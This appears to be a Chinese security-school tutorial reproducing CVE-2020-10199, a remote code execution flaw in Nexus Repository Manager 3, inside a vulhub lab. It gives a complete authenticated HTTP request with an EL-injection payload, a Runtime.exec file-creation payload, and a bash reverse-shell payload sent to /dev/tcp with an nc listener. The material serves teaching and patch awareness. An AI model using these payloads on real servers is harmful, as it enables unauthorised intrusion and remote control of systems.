<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4vqAvwv0CB_8g3bsyNZyGQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6pRiabDicuyO5uBZsDB68SyC0XxgOZhLhlViaOZ1YCIFFeMJjrXWeooBlQ1e4FbKVVYYVGyuZZkicfBA/640?wx_fmt=gif)

本文由 “网络安全检测与防护技术国家地方联合工程研究中心深圳分中心——东塔网络安全学院” 总结归纳

**Nexus Repository Manager 3 远程命令执行漏洞复现（CVE-2020-10199）**  

**0x0****0** **简介**

nexus 的全称是 Nexus Repository Manager，是 Sonatype 公司的一个产品。它是一个强大的仓库管理器，极大地简化了内部仓库的维护和外部仓库的访问。

主要用它来搭建公司内部的 maven 私服。但是它的功能不仅仅是创建 maven 私有仓库这么简单，还可以作为 nuget、docker、npm、bower、pypi、rubygems、git lfs、yum、go、apt 等的私有仓库，功能非常强大。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzu38WTOibjNicGjqxrYAqMegUTKQwcEfEW0oYqO2ArbP9TfdcRDnrtN4fw/640?wx_fmt=png) 

**0x01 漏洞概述**

在 Nexus Repository Manager OSS/Pro 3.21.1 及之前的版本中，由于某处功能安全处理不当，导致经过授权认证的攻击者，可以在远程通过构造恶意的 HTTP 请求，在服务端执行任意恶意代码，获取系统权限。**此漏洞的利用需要攻击者具备任意类型的账号权限**。

**0x02 影响版本**

Nexus Repository Manager OSS/Pro 3.x <= 3.21.1

**0x03 环境搭建**

1、本次漏洞环境使用 vulhub 搭建，在有 docker 环境的虚拟机中下载

git clone https://github.com/vulhub/vulhub.git

2、进入漏洞目录，执行 docker-compose up -d 命令拉取漏洞环境

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzu4BLrQ2OWAJ2oyubk8ad7Cvoeic4QIY0l82CSuadBc07HOUpqSZlSZzw/640?wx_fmt=png)

3、看到绿色的 done 表示拉取成功，在浏览器访问 http://your-ip:8081 查看页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzucQGmqYMZRbjfa0Fjb5PamMiavcE5AGyV5Ylm1aMLs0xfPYGDq9ibZZUw/640?wx_fmt=png) 

**0x04 漏洞复现**

1、首先使用账号密码 admin/admin 登录后台

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzuUTfW93WhxndX6K8RJibcNwwKINuia7KkDLgtTxzIicXXYGhJXen0EvKMA/640?wx_fmt=png)

2、登录后使用 f12 找到 cookie 复制当前的 csrf-Token

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzulekqlu3l7icUP8O68xMiaePhjBZQ7w3mg9mu8zyHAPmht3X4C2tERicaw/640?wx_fmt=png)

3、使用 burp 进行抓包，替换以下数据包，然后把自己的 cookie 和 csrf-Token 粘贴上去，然后发包即可看到执行了 9*9

```
POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: 172.16.1.147:8081
Content-Length: 203
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
NX-ANTI-CSRF-TOKEN: 0.16290768329434402
Content-Type: application/json
Accept: */*
Origin: http://172.16.1.147:8081
Referer: http://172.16.1.147:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: NX-ANTI-CSRF-TOKEN=0.16290768329434402; NXSESSIONID=69d8dc11-45ac-44b6-aa68-65ca1d6b68ff
Connection: close


{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\A{9*9}"]
  }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzuHSptufd4oViaUCeJB4ichRiau0GkGC3IFKySZSpg9GZ2lxvGlMqM6frGA/640?wx_fmt=png) 

4、把执行 9*9 修改为创建一个文件，进入 docker 中查看创建成功

$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzumviaWkRjqiatb7I5vFAn9PSflEaecLu1aEyRz1dJHdScFMOKT9tWZWCg/640?wx_fmt=png) 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzullk2MFz71ta77dTk62RHEsVNcZa3Z2kooDm0AzTSabxYuRibJScSALA/640?wx_fmt=png) 

5、执行反弹 shell 把执行写入文件的 payload 修改成反弹 shell 的命令，使用 nc 进行监听，点击发送查看 nc 的监听看到返回了 shell

"$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/ip/port<&1')}"

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzulVWxy9R5ic9FBHYiciaH1X6VoibjocJUcHJjzG7YtDH44S2pn41R2dQgZg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzuRcLhs0ePTGic5c5ibKORUv6yqYWFFs16gDWM1EZobNO4upVagf5GABEw/640?wx_fmt=png) 

**0x0****5** **修复建议**

1、官方已发布新版本修复了该漏洞，建议升级至最新版本

参考链接：

https://mp.weixin.qq.com/s/CAtsX3yP81mULbMDTo0J1A

免责申明：   

本项目仅进行信息搜集，漏洞探测工作，无漏洞利用、攻击性行为，发文初衷为仅为方便安全人员对授权项目完成测试工作和学习交流使用。

请使用者遵守当地相关法律，勿用于非授权测试，勿用于非授权测试，勿用于非授权测试（重要的事情说三遍），如作他用所承受的法律责任一概与东塔网络安全学院无关！

东塔网络安全学院在各大平台均上线了各项活动和学习内容，快快登录以下各大平台学习起来吧~  

微博、腾讯课堂、知乎、今日头条、抖音：

东塔网络安全学院

哔哩哔哩：东塔网络安全

了解更多活动和咨询欢迎微信添加：dongtakefu

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzuqES8apgRvZc1oVC9P9IhyLD0IWd9Expib4WHzLRdRfq43T2H0ibVpTog/640?wx_fmt=jpeg)

- 免费获取学习资料

电子书籍、试听课程 -

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzuicUoiaoK9OaXWolfN0Hec20wHXSO5OicWic6ib10uWKORf8tFic9DTiclty5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzuuze9sQNwbFKohkcSpFFemC9a4Ie5MXZdbeEorE2MicSbmZ14UEHicicdg/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzubUDe92D3WXDfNqlBpvA9dR7fpJWxIP6kXzfVvOCLMmwIMlYR7kXnhw/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqQwatjQSeJFzgicicShJEnzuvpqz7N6f1aFhX4tDmdRM9gZWKW7VjrnBTtf57WWptjwHKp2ZbEXGHA/640?wx_fmt=png)

点在看